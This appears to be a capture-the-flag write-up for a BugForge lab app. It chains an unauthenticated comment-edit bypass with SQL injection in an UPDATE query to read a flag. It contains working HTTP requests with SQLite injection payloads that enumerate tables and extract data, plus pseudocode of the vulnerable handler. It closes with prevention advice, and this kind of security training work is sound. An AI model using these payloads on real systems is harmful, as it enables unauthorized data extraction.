---
title: Ottergram - SQLi
tags:
  - bugforge
  - sqli
  - broken-access-control
  - autorize
  - burpsuite
---

- Third round with the otters - this time combining Broken Access Control with SQL Injection
- The key lesson from this one: always test with NO authentication, not just wrong-user tokens
- Used Burp Suite with Autorize extension to automate the access control discovery

## Reconnaissance

- Same app as before - React SPA + Express backend + SQLite
- Registered a user, browsed around, posted a comment

1. Endpoint Discovery (via Burp Proxy History)

```
GET  /api/posts                - List posts
GET  /api/posts/{id}/comments  - List comments
POST /api/posts/{id}/comments  - Add comment (requires auth)
PUT  /api/comments/{id}        - Edit comment (requires auth... or does it?)
GET  /api/profile/{username}   - View profile
PUT  /api/profile              - Update profile
GET  /api/admin                - Admin panel (requires admin role)
POST /api/login                - Login
POST /api/register             - Register
```

2. Users

```
id:1 - otter_lover
id:2 - admin (role: admin)
id:3 - sea_otter_fan
id:4 - tester (me, role: user)
```

## Autorize - Access Control Testing

- Loaded the Autorize extension in Burp to passively detect authorization bypasses
- Configuration:
  - Interception Filter: URL Contains `/api/`
  - Unauthenticated Detection: Body contains `Access token required`
  - Cleared all default placeholder headers (important - Autorize ships with dummy Cookie/Auth headers)

- Browsed the app normally with my auth token while Autorize tested every request with no authentication in the background


![Autorize config](/BugForge/img/ottersqli-01.png)
![Unauthorize config](/BugForge/img/ottersqli-05.png)

- Autorize results immediately lit up red on the PUT /api/comments endpoint
- Every other endpoint correctly returned 401 (green/yellow) - but PUT comments showed **Bypassed!**

![Autorize results showing Bypassed](/BugForge/img/ottersqli-02.png)

## The Vulnerability - No-Auth Comment Edit

- The edit comment endpoint (`PUT /api/comments/:id`) has no authentication middleware
- The ownership check (`is this your comment?`) sits inside an `if (req.user)` block
- When you send a request with NO Authorization header, `req.user` is undefined
- The ownership check is skipped entirely - you can edit any comment without logging in

```javascript
// Pseudocode of the vulnerable pattern
app.put('/api/comments/:id', (req, res) => {
  if (req.user) {
    // Only checks ownership IF a token is provided
    if (req.user.id !== comment.user_id) {
      return res.status(403).json({ error: "Not authorized" });
    }
  }
  // Falls through here when no token - updates anyway!
  db.run(`UPDATE comments SET content = '${content}' WHERE id = ${id}`);
});
```

- This is the Three-Token Test lesson:

| Test | Authorization Header | Result | Meaning |
|------|---------------------|--------|---------|
| Admin token | Bearer admin-jwt | 200 | Baseline |
| Wrong-user token | Bearer tester-jwt | 403 | Ownership check works IF authenticated |
| No token at all | (none) | 200 | Authentication bypass - ownership check skipped |

- A 403 with the wrong token does NOT mean the endpoint is secure

## SQL Injection - Exploitation

- With the ability to edit any comment without auth, the next question: is the content field parameterized?
- Sent the PUT from Repeater with no auth header and a SQLi payload

### Step 1 - Enumerate Tables

```
PUT /api/comments/3 HTTP/2
Host: lab-1771068220506-ke92sm.labs-app.bugforge.io
Content-Type: application/json

{"content":"x' || (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table') || '"}
```

- Response: `200 "Comment updated successfully"`
- The UPDATE query is NOT parameterized - the content value is string-concatenated

![SQLi PUT request - no auth header](/BugForge/img/ottersqli-03.png)

### How the Injection Works

The backend runs:

```sql
UPDATE comments SET content = 'x' || (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table') || '' WHERE id = 3
```

- `x'` closes the opening quote
- `||` is SQLite string concatenation
- The subquery runs and its result gets stored as the comment content
- `|| '` closes the trailing quote from the original SQL

### Step 2 - Read Back the Result

```
GET /api/posts/1/comments HTTP/2
Host: lab-1771068220506-ke92sm.labs-app.bugforge.io
Authorization: Bearer <token>
```

- Comment 3 now contains the table names instead of the original text
- This revealed the database schema including the table containing the flag

### Step 3 - Extract the Flag

```
PUT /api/comments/3 HTTP/2
Host: lab-1771068220506-ke92sm.labs-app.bugforge.io
Content-Type: application/json

{"content":"x' || (SELECT flag FROM flags LIMIT 1) || '"}
```

- Read the comment back - flag is in the content field

![Flag in comment response](/BugForge/img/ottersqli-04.png)

## Flag

```
bug{...}
```

- Two chained vulnerabilities: authentication bypass + SQL injection
- The no-auth bypass was the gate - without it, you'd need to own the comment (or be admin) to edit
- The SQLi was the payload - turning a comment field into a data exfiltration channel

## Security Takeaways

### Vulnerability Chain

1. **Broken Access Control** - PUT /api/comments/:id lacks authentication middleware
2. **SQL Injection** - Content field in UPDATE query uses string concatenation, not parameterized queries

### Why This Happens

- Authentication middleware applied inconsistently across routes
- POST (create) is protected but PUT (edit) is not
- Authorization check placed inside authenticated block - unreachable without auth
- Different code paths for INSERT (parameterized) vs UPDATE (concatenated) on the same table

### Key Lessons

1. **Three-Token Test** - Always test admin token, user token, AND no token. A 403 with wrong credentials does not prove the endpoint is secure
2. **Test every SQL operation** - INSERT being parameterized does not mean UPDATE is too. Different code paths, different vulnerabilities
3. **Autorize automates this** - The Burp extension caught the no-auth bypass passively while browsing. Red row = investigate immediately
4. **In-band SQLi via UPDATE** - When you can write to a field and read it back, you have a data exfiltration channel through the application itself

### Prevention

- Apply authentication middleware at the router level, not per-handler
- Use parameterized queries for ALL operations (INSERT, UPDATE, DELETE, SELECT)
- Never place authorization checks inside conditional blocks that can be skipped
- Implement automated access control testing in CI/CD (like Autorize but in pipeline)
